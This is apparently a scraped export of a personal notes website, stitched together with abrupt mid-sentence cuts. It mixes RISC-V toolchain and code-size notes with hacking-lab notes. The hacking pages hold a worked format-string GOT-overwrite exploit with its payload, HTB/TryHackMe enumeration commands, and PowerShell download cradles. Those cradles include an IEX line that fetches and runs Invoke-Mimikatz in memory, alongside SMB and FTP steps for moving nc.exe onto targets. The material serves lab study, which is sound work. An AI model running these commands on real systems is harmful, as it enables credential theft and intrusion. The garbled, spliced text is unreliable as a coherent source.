SPDX-License-Identifier: GPL-3.0-or-later */\n\n/* This version uses Tony Hoare's original algorithm as described in Comp.

The GNU RISC-V toolchain\n2.  The LLVM RISC-V toolchain\n\nBoth toolchains provide a state-of-the-art optimising [compiler](notes/private/work/compilers.md), assembler, linker, and various other tools to build applications that run on RISC-V machines.\n\n## Where to download the toolchains and simulator\nThe official [RISC-V GitHub repository](https://github.com/riscv-collab/riscv-gcc) provides the source code for the `riscv-gnu` toolchain, and the prebuilt toolchain can be downloaded from [here](https://github.com/riscv-software-src/riscv-gnu-toolchain). \n\nThe RISC-V compiler is generally used as a cross-compiler, as many RISC-V processors are used for low-power embedded applications. Currently, the RISC-V cross-compilers can only be run on [ELF targets](https://en.wikipedia.org/wiki/Comparison_of_executable_file_formats) like Linux machines.\n\nThe RISC-V LLVM toolchain is not readily available from third-party providers, but one can build it from source by downloading the open source [llvm-project](https://github.com/llvm/llvm-project). We describe an easy way to use the llvm toolchain with gnu sysroot.\n\nThe RISC-V simulator can be downloaded from the official RISC-V GitHub repository: [riscv/riscv-isa-sim: Spike, a RISC-V ISA Simulator](https://github.com/riscv/riscv-isa-sim). Although RISC-V boards are readily available from several vendors, using simulators is an easy way to get started with RISC-V development.\n\n## Building Application with the Toolchain\nIn order to build a RISC-V application, using a [cross-compiler](notes/general/cross-compilation.md) toolchain is the same as any other cross-compiler-based development system. Two things are required:\n\n-   The [compiler toolchain](notes/private/work/compiler-toolchains.md)\n-   [sysroot](notes/private/work/sysroot.md)\n\nWe have described the compiler toolchain and sysroot in the first chapter. Before learning how to build applications with the RISC-V toolchain, we’d like to introduce an interesting naming convention that has been used for cross-compilers.\n\n### Compiler Naming Convention\nWhen you download the GCC toolchain, you'll find a `riscv64-unknown-elf-gcc` binary in the `bin` directory. This is the same GCC [compiler](notes/private/work/compilers.md) with inbuilt information of sysroot and platform. It is a convention to name [cross-compilers](notes/general/cross-compilation.md) that way. \n\nThe naming is typically using the `arch-vendor-os-abi` format. So, `riscv64-unknown-elf-gcc` means that this is a [cross-compiler](notes/general/cross-compilation.md) for RISC-V 64 bit, and tit will generate an `elf` binary, which can run on Linux machines for example. An excellent reference on naming convention can be found [here](http://web.eecs.umich.edu/~prabal/teaching/eecs373-f12/notes/notes-toolchain.pdf). In cases where a compiler's name doesn't have the target triplet, the `-dumpmachine` flag can be used to get that:\n\n```bash\n$ gcc -dumpmachine \nx86_64-linux-gnu\n```\n\nWith the `riscv64-unknown-elf-gcc` compiler handy, a file can then be compiled in the following ways:\n\n```bash\n$ riscv64-unknown-elf-gcc -O2 -o a.out hello.c\n$ riscv64-unknown-elf-gcc -O2 hello.c -mabi=lp64d -march=rv64ifd\n```\n\nThe `-march` flag is used to specify the target sub-architecture for which the assembly will be generated. The `-mabi` flag is used to specify data models. For more details on data models, refer to [](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models) section of 64-bit computing in Wikipedia.\n\nWith the [llvm toolchain](notes/general/llvm.md), the binary can be built similarly. Assuming [sysroot](notes/private/work/sysroot.md) is in the `riscv64-unknown-elf` directory:\n\n```bash\n$ clang test.c -c --sysroot riscv64-unknown-elf -target  \nriscv64-unknown-elf -march=rv64ifd\n```\n\nRISC-V applications can be launched on a device, a simulator, or an emulator.\n\n## Running the Applications on Spike Simulator\nOne of the most convenient ways to run small applications is to use the RISC-V simulator. The build and installation steps are fairly straightforward. For this, you need the following dependencies:\n\n1.  A Linux machine - building a Linux image on non-Linux machines is non-trivial, so it is recommended you have a Linux machine to begin with.\n2.

To install the proxy kernel follow the instructions on their github README. For convenience, you can install both spike and pk in the same directory as the riscv64 toolchain directory by providing the path to toolchain directory as install prefix for both.)\n3.  RISC-V simulator spike: [https://github.com/riscv-software-src/riscv-isa-sim](https://github.com/riscv-software-src/riscv-isa-sim)\n4.  RISC-V proxy kernel pk: [https://github.com/riscv-software-src/riscv-pk](https://github.com/riscv-software-src/riscv-pk)\n\nThe instructions to run a simple `hello-world` app on the Spike simulator are mentioned in their GitHub [](https://github.com/riscv/riscv-isa-sim#compiling-and-running-a-simple-c-program). To install the proxy kernel, follow the instructions on their GitHub [README](https://github.com/riscv-software-src/riscv-pk). For convenience, you can install both `spike` and `pk` in the same directory as the `riscv64` toolchain directory by providing the path to the toolchain directory as install `prefix` for both.\n\n## Running Applications on an Emulator\nRunning a RISC-V application on an emulator gives you more flexibility, but the installation steps are more involved. In order to run a RISC-V application on an emulator, you need to have the following dependencies:\n\n1.  A Linux machine - building a Linux image on non-Linux machines is non-trivial, so it is recommended you have a Linux machine to begin with.\n2.

These techniques take advantage of well-known software engineering methodologies and programming language features.\n\n## Code Refactoring\nMoving function definitions to the `.c/.cpp` file. When function definitions are put in header files, they get duplicated in every translation unit that includes the header file. Even though only one definition remains in the end (thanks to ODR), these functions may have been inlined in their callers and that extra code size will persist in the binary. So, it is a good idea to put function definitions in `.c/.cpp` files.\n\nIn addition to functions that were written by developers, there are [compiler](notes/private/work/compilers.md)-generated functions like constructors, destructors, operator overloads, etc. Even these functions can contribute to code size depending on the structure of the type and language rules. So, programmers can explicitly instantiate these methods in the `.cpp` file. One can either do a ‘default’ instantiation or an explicit instantiation. For example:\n\nIn `test.h`, the class is declared\n\n```cpp\nclass A {  \n  A(); \n  A(A const\u0026);\n  ~A();\n};\n```\n\nIn `test.cpp`, the definitions are instantiated:\n\n```cpp\nA::A() = default;  \nA(A const\u0026) = default;  \nA::~A() = default;\n```\n\nSimilar to how function definitions in header files contribute to code size, template functions do the same. It is however a non-trivial amount of work to reduce their overhead. It is often the case that some types are used more often than others. For the commonly used types, we can explicitly instantiate them in a `.cpp` file. For example:\n\nIn the `test.h` file, the template is defined:\n\n```cpp\ntemplate\u003cclass T\u003e  \nstruct  a {  \nvoid f(T t) { /* */ }  \n};\n```\n\nIn the `test.cpp` file, the template is explicitly instantiated:\n\n```cpp\ntemplate struct A\u003cint\u003e;\n```\n\nExplicit instantiations also save compile time as the instantiation happens once. For more ideas on source code optimisations, you can watch Aditya Kumar's presentation at the RISC-V Global Forum 2020: [_\"Code Size Compiler Optimisations and Techniques for Embedded Systems\"_](https://www.youtube.com/watch?v=6IuDWfuMEno).\n\n## Function Attributes\n\nFunction attributes that reduce inline potential can help reduce code size. For example:\n\n- `__attribute__((cold))`\n- `__attribute__((noinline))`\n\nNote that in some cases, inlining may reduce the code size. Especially, with tiny functions, inlining removes the function call overhead, which may be more than the size of the function body itself. It is advisable to use these attributes in limited cases as they affect the readability of programs.\n\n## Reducing Binary Size by Moving Evaluations Out of the Binary**\nWith a good knowledge of [compiler](notes/private/work/compilers.md) optimisations and requirements of the programming language, it is possible to move evaluations out of the binary. Some of the expressions can be evaluated at compile time, while some others can be delayed until runtime. Both approaches help reduce the binary size. Following are motivating examples:\n\nEarly evaluation: Using language features like `constexpr`, `static_assert` of C++ some of the expressions can be evaluated early for example:\n\n```cpp\nconstexpr auto gcd(int a, int b){  \n while (b != 0){  \n  auto t= b;  \n  b= a %b;  \n  a= t;  \n }  \n return a;  \n}\n\nint main(){  \n   int a= 11;  \n   int b= 121;  \n   int j= gcd(a,b);  \n   constexpr int i= gcd(10,12); // saves ‘2’ in the final assembly.  \n   return i + j;  \n}\n```\n\nCompiling the above program with `g++ -std=c++17 -fno-exceptions -S`:\n\n```assembly\nmain:  \n       mov     edx, 121  \n       mov     eax, 11  \n.L2:                 # inlined call to gcd(a, b)  \n       mov     ecx, edx  \n       cdq  \n       idiv    ecx  \n       mov     eax, ecx  \n       test    edx, edx  \n       jne     .L2  \n       add     eax, 2 # Precomputed value of gcd(10,12)  \n       ret\n```\n\nWe can see in the assembly that the second `gcd` has been evaluated at the compile time, but the first call to `gcd` has the entire code in it. This is because the second call to the `gcd` function is a `constexpr`. You can learn more about `constexpr` expressions on the [constexpr specifier web page](https://en.cppreference.com/w/cpp/language/constexp).\n\n## Simple Tricks to Find Dead Code in Binary\nIn any large project, there is likely dead code because of various reasons. Some of the dead code can be removed with simple tricks; for example:\n\n- Finding testing and debugging code shipped in production. It is non-trivial to find testing/debugging code by grepping the source code; however, searching in the binary provides a high signal/noise ratio. `nm` can be used to search symbol names in a binary. \n \n`nm \u003cBinary\u003e | grep -i \"test\\|debug\"`\n\n- Finding strings in the binary using the `strings` tool. As explained before, strings will print all the C-strings hardcoded in the binary. By looking at the strings we can investigate why a particular string ends up in the final binary.","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs"]},"/notes/general/stack":{"title":"Stack","content":"# Stack\n---\n- Last in, first out (**LIFO**), simple [list](notes/general/lists.md) works well for this. \n    - Think of a stack of plates.\n    - The add and remove operations are called **push** and **pop**.\n\nAll insertions and deletions take place at one end.\n\n- To add an item to the stack you **push** it onto the top.\n- To remote an item from the top you **pop** it.\n\nIn the example below the top of the stack is on the right hand side:\n\n![Screenshot 2022-10-24 at 12.17.29](notes/images/Screenshot%202022-10-24%20at%2012.17.29.png)\n\n\n## In depth\nThe **stack** is a defined area in **RAM**. Usually in RAM's lower area above the global and static variables. The contents are accessed via the **stack pointer**, set to the upper end of the stack during initialisation. During execution, the stack grows down to the lower memory addresses.\n\nModern memory protections (**DEP**/**ASLR**) would prevent the damage cause by buffer overflows. DEP (Data Execution Prevention), marked regions of memory \"Read-Only\". The read-only memory regions is where some user-input is stored (Example: The Stack), so the idea behind DEP was to prevent users from uploading shellcode to memory and then setting the instruction pointer to the shellcode. Hackers started utilising ROP (Return Oriented Programming) to get around this, as it allowed them to upload the shellcode to an executable space and use existing calls to execute it. With ROP, the attacker needs to know the memory addresses where things are stored, so the defense against it was to implement ASLR (Address Space Layout Randomisation) which randomises where everything is stored making ROP more difficult.\n\nUsers can get around ASLR by leaking memory addresses, but this makes exploits less reliable and sometimes impossible. For example the [\"Freefloat FTP Server\"](https://www.exploit-db.com/exploits/46763) is trivial to exploit on Windows XP (before DEP/ASLR). However, if the application is ran on a modern Windows operating system the buffer overflow exists but it is currently non-trivial to exploit due to DEP/ASLR because there's no known way to leak memory addresses.\n\n### Stack Frames\nThe **base pointer** points to the beginning (base) of the stack in contrast to the **stack pointer**, which points to the top.\n\nAs the stack grows it is divided into regions called **Stack Frames**, which allocate the required memory in the stack for the corresponding function. It defines a frame with the beginning (**EBP**) and the end (**ESP**) that is pushed onto the stack when a function is called.\n\nSince the memory is built on a **LIFO** data structure, the first step is to store the **previous EBP** position on the stack, which can be restored after the function completes.\n\n#### Prologue\n```bash\n(gdb) disas bowfunc \n\nDump of assembler code for function bowfunc:\n   0x0000054d \u003c+0\u003e:\t    push   ebp       # \u003c---- 1.

For example, `breakrva \u003ca function for example 0x11f0` sets a breakpoint in that function no matter if the program restarts as it knows the offset from the top of the run.\n\nTo find **libc** in a remote server: https://libc.blukat.me/ by using the leaked address, for example puts.\n\nWe can find the `GOT.printf` address in Ghidra, inside `.got.plt`. We can then write something at it.\n\n### Tutorial\n- Need to overwrite 0x0804c00c (`GOT.printf`) with 0xf7dff040 (`LIBC.system`).\n\n- It means writing 0xf7df (63455) @ 0x0804c00c + 2 = 0x0804c00e (high order) and 0xf040 (61504) @ 0x0804c00c (low order).\n\n- Now, we have to figure out the value to set for the padding. Here is the formula :\n\n```\n[The value we want] - [The bytes alredy wrote] = [The value to set].            \n```                                                                                  \n\n- Let’s start with the low order bytes :                                        \n\nIt’ll will be 61504 - 8 = 61496, because we already wrote 8 bytes (the two 4 bytes addresses).\n\n- Then, the high order bytes:                                                  \n\nIt’ll will be 63455 - 61504 = 1951, because we already wrote 61504 bytes (the two 4 bytes addresses and 61496 bytes from the previous writing).                                                     \n\n- Now we can construct the exploit (note our write offset is `%4` so we want `[%4,%5]` as offsets instead of `[%7,%8]`):\n\n```\n      \\x0c\\xc0\\x04\\x08 or 0x0804c00c (in reverse order) points to the low order bytes.    \n      \\x0e\\xc0\\x04\\x08 or 0x0804c00e (in reverse order) points to the high order bytes.\n      %61496x will write 61496 bytes on the standard output.                                              \n      %4$hn will write 8 + 61496 = 61504 bytes (or 0xf040) at the first address specified (0x0804c00c).\n      %1951x will write 1951 bytes on the standard output.                                                  \n      %5$hn will write 8 + 61496 + 1951 = 63455 (or 0xf7df) at the second address specified (0x0804c00e).\n```                                                                                            \n\n```python\n  python2 -c 'print(\"\\x0c\\xc0\\x04\\x08\\x0e\\xc0\\x04\\x08%61496x%4$hn%1951x%5$hn\")' \u003e payload\n```                                                                                      \n\n  * Based on excellent blogpost: https://axcheron.github.io/exploit-101-format-strings/\n\n```bash\n(cat payload; cat) | ./got_overwrite\n```\n\n## HTB - Explosion (Starting Point)\n- Info on ports [here](https://www.speedguide.net/ports.php).\n\n## HTB - Preignition (Starting Point)\n- Dir busting:\n```bash\nsudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {ip}\n```\n\n## HTB - Bike (Starting Point)\nHacktricks guide ([here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection))\n\n### Useful tools\n- Ghidra\n- GDB\n- Radare2\n- Ropper\n- GDB-PwnDBG\n- LTrace","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/hacking","cs/hacking/htb"]},"/notes/hacking/cpu-architecture":{"title":"CPU Architecture","content":"This is part of a guide that you can find [here](notes/hacking/htb-stack-based-overflow-linux.md).\n\nA **Von-Neumann** architecture consists of four functional units:\n- Memory\n- Control Unit\n- Arithmetic Logical Unit\n- Input/Output Unit\n\nThe most important units, **Arithmetic Logical Unit** (ALU) and **Control Unit** (CU), are combined in the actual **Central Processing Unit** (CPU).\n\n```toc\nstyle: number min_depth: 1 max_depth: 6 \n```\n\n## Control Unit\nIt is responsible for the correct interworking of the processor's individual parts. The tasks can be summarised as:\n\n- Reading data from the RAM\n- Saving data in RAM\n- Provide, decode and execute an instruction\n- Processing the inputs from peripheral devices\n- Processing of outputs to peripheral devices\n- Interrupt control\n- Monitoring of the entire system\n\nThe **CU** contains the **Instruction Register** (IR), which contains all instructions that the processor decodes and executes. The instruction decoder translates the instruction and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the **ALU** for calculation and receives the result back from there.\n\nData used during execution temporarily is stored in **registers**.\n\n## Central Processing Unit\nIt provides the actual processing power. It fetches commands from memory one after the other and initiates data processing.\n\nThe processor is also often referred to as **microprocessor** when placed in a single electronic circuit, as in our PCs.\n\nThe best-known **CPU architectures** are:\n- x86/i386 - (AMD and Intel)\n- x86-64/amd64 - (Microsoft and Sun)\n- ARM - (Acorn)\n\nEach of them is built in a specific way, called **Instruction Set Architecture** (ISA). It describes the behaviour of a CPU concerning the instruction set used. Above all, ISA gives us the possibility to understand the unified behaviour of **machine code** in **assembly language** concerning **registers**, **data types** etc.\n\nThere are four different types of ISA:\n- CISC - Complex Instruction Set Computing\n- RISC - Reduced Instruction Set Computing\n- VLIW - Very Long Instruction Word\n- EPIC - Explicitly Parallel Instruction Computing\n\n## Memory\nWhen the program is called, the sections are mapped to the segments in the process, and the segments are loaded into memory as described by the **ELF** file.\n\n![Screenshot 2022-07-11 at 16.50.22.png](Screenshot%202022-07-11%20at%2016.50.22.png)\n\n- `.text` - contains the actual assembler instructions of the program, can be read-only.\n- `.data` - contains global and static variables.\n- `.bss` - data segment, which contains statically allocated variables represented by 0 bits.\n\n### Primary\nIt is the **cache** and the **Random Access Memory** (RAM).\n\nThe cache is integrated into the processor and serves as a buffer. Before the program code and data enter the processor for processing the RAM serves as data storage.\n\nWhen the primary memory loses power, all stored contents are lost.\n\n### Secondary\nThis is the external data storage,  such as **HDD/SSD**, **Flash Drives** and **CD/DVD-ROMs** of a computer, which is **not** directly accessed by the CPU, but via the **I/O** interfaces.\n\n## Heap\nThis area starts at the end of the `.bss` segment and grows to the higher memory addresses.\n\n## CPU Registers\nThere are General registers, Control registers and Segment registers.\n\nWithin the General registers we have the Data registers, Pointer registers and Index registers.\n\n### Data Registers\n| **32-bit Register** | **64-bit Register** | **Description** |\n| --- | --- | --- |\n| `EAX` | `RAX` | Accumulator is used in input/output and for arithmetic operations |\n| `EBX` | `RBX` | Base is used in indexed addressing |\n| `ECX` | `RCX` | Counter is used to rotate instructions and count loops |\n| `EDX` | `RDX` | Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values |\n\n### Pointer registers\n| **32-bit Register** | **64-bit Register** | **Description** |\n| --- | --- | --- |\n| `EIP` | `RIP` | Instruction Pointer stores the offset address of the next instruction to be executed |\n| `ESP` | `RSP` | Stack Pointer points to the top of the stack |\n| `EBP` | `RBP` | Base Pointer is also known as `Stack Base Pointer` or `Frame Pointer` thats points to the base of the stack |\n\n### Index Registers\n| **Register 32-bit** | **Register 64-bit** | **Description** |\n| --- | --- | --- |\n| `ESI` | `RSI` | Source Index is used as a pointer from a source for string operations |\n| `EDI` | `RDI` | Destination is used as a pointer to a destination for string operations |\n\n## Instruction Cycle\n| Instruction                | Description                                                                                                                                    |\n| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| Fetch                      | Read from the **Instruction Address Register** (IAR) then load from the **cache** or **RAM** into the **Instruction Register** (IR).           |\n| Decode                     | Converts instruction and starts to execute.                                                                                                    |\n| Fetch Operands             | If further data needs to be loaded, load from **cache** or **RAM**.                                                                            |\n| Execute                    | The instruction is executed. It could be operations in the ALU for example, or the control of peripheral devices.                              |\n| Update Instruction Pointer | If no jump has been executed, the **IAR** is now increased by the length of the instruction so that it points to the next machine instruction. |\n\n## Vulnerable C Functions\n- `strcpy`\n- `gets`\n- `sprintf`\n- `scanf`\n- `strcat`\n\n## The Call Instruction\nIt performs two operations:\n\n1. Pushes the return address onto the **stack** so that the execution of the program can be continued after the function has successfully fulfilled its goal.\n2. Changes the **instruction pointer** (**EIP**) to the call destination and starts execution there.\n\n## See Also\n- [Stack Overflow Guide - HTB](notes/hacking/htb-stack-based-overflow-linux.md)\n- [Stacks and Queues](notes/general/stack.md)\n- [Endianness](notes/hacking/endianness.md)\n- [GDB](notes/private/work/gdb.md)","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/hacking","cs/hacking/htb"]},"/notes/hacking/daily-bugle-writeup":{"title":"2022-07-15","content":"# Daily Bugle Writeup (TryHackMe)\n```bash\nnmap -sV -sC 10.10.213.110\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 11:59 BST\nNmap scan report for 10.10.213.110\nHost is up (0.065s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)\n|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)\n|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n| http-robots.txt: 15 disallowed entries \n| /joomla/administrator/ /administrator/ /bin/ /cache/ \n| /cli/ /components/ /includes/ /installation/ /language/ \n|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n|_http-title: Home\n|_http-generator: Joomla! - Open Source Content Management\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n3306/tcp open  mysql   MariaDB (unauthorized)\n\nService detection performed.

Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.\n\n## Downloading Files using PowerShell\n- DownloadFile method: we can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.\n\n```powershell\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFile('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFileAsync('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n```\n\n- Fileless Method: as we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.\n\n```powershell\nPS C:\\htb\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n```\n\n`IEX` also accepts pipeline input.\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n- Invoke-WebRequest: from PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n```\n\nHarmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). \n\n## Setup Internet Explorer Error\n\n![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)\n\nCan be bypassed using the parameter `-UseBasicParsing`:\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete.

It enables applications and users to transfer files to and from remote servers.\n\nWe can use SMB to download files easily. We need to create an SMB server with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.\n\n- Create the server:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n- Copy file from SMB server:\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n```\n\nIn this case:\n\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n```\n\nWe can set the username and password using the Impacket SMB server and mount it on our windows target machine:\n\n1. Create the SMB server with a username and password:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n2. Mount the SMB Server with username and password:\n\n```cmd\nC:\\htb\u003e net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb\u003e copy n:\\nc.exe\n        1 file(s) copied.\n```\n\n## FTP Downloads\nAnother way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.\n\nWe can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:\n\n- Installing the FTP Server Python3 Module - pyftpdlib\n\n```shell\nPietra@htb[/htb]$ sudo pip3 install pyftpdlib\n```\n\nThen we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.\n\n- Setting up a Python3 FTP Server\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=3210 \u003c\u003c\u003c\n```\n\nAfter the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.\n\n- Transfering Files from an FTP Server Using PowerShell\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n```\n\nWhen we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.\n\n- Create a Command File for the FTP Client and Download the Target File\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo GET file.txt \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e GET file.txt\nftp\u003e bye\n\nC:\\htb\u003emore file.txt\nThis is a test file\n```\n\n# Upload Operations\n## PowerShell Base64 Encode and Decode\n- Encode using PowerShell:\n\n```powershell\nPS C:\\htb\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\htb\u003e Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n```\n\nWe copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.\n\n- Decode Base64 String in Linux:\n\n```shell\nPietra@htb[/htb]$ echo 